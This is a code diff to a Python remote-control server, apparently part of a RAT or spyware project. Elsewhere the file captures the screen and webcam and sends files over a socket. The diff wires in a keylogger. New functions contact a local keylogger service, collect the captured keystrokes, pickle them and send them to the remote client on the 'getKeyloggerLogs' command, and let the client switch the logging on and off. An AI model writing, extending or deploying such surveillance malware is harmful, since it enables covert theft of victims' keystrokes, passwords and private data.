@@ -4,10 +4,12 @@ import os
 import pyautogui
 import cv2 as cv
 import subprocess
+import pickle
 
 HEADER = 64 
 PORT = 5000
 SERVER = "127.0.0.1"
+KEYLOGGERADDR = ("127.0.0.1", 5050)
 ADDR = (SERVER, PORT)
 FORMAT = "utf-8"
 DISCONNECTED_MESSAGE = "DISCONNECT"
@@ -49,6 +51,46 @@ def cameraCapture():
         print("No image detected. Please! try again")
 
 
+def getLogs() -> list[str]:
+    # Connect to local keylogger socket
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn.connect(KEYLOGGERADDR)
+
+    # Send message logs, with header
+    msg = "logs"
+    msg_length = len(msg)
+    msg_length = str(msg_length).encode(FORMAT)
+    msg_length += b" " * (HEADER - len(msg_length))
+    conn.send(msg_length)
+    conn.send(msg.encode(FORMAT))
+
+    # Get logs back as a number of logs and strings for each log, then save to logs list
+    # Should use pickling
+    # Pickling is to be used later
+    # Also I don't feel like refactoring, so make a PR if you care enough
+    logs = []
+    numLogs = int(conn.recv(1024).decode(FORMAT))
+    for log in range(numLogs):
+        size = int(conn.recv(HEADER).decode(FORMAT))
+        logs.append(conn.recv(size).decode(FORMAT))
+
+    return logs
+
+
+def toggleLogger() -> None:
+    # Connect to local keylogger socket
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn.connect(KEYLOGGERADDR)
+
+    # Send toggle message
+    msg = "toggle"
+    msg_length = len(msg)
+    msg_length = str(msg_length).encode(FORMAT)
+    msg_length += b" " * (HEADER - len(msg_length))
+    conn.send(msg_length)
+    conn.send(msg.encode(FORMAT))
+
+
 def handleConnection(conn: socket, addr):
     print(f"{addr} has connected!")
     connected = True
@@ -88,9 +130,16 @@ def handleConnection(conn: socket, addr):
                     data = f.read()
                     conn.sendall(data)
                 elif msg == "getKeyloggerLogs":
-                    pass
+                    logs = getLogs()
+                    pickledLogs = pickle.dumps(logs)
+                    msg_length = len(pickledLogs)
+                    msg_length = str(msg_length).encode(FORMAT)
+                    msg_length += b" " * (HEADER - len(msg_length))
+                    conn.send(msg_length)
+                    conn.send(pickledLogs)
+
                 elif msg == "toggleKeylogger":
-                    pass
+                    toggleLogger()
 
 
 def main():
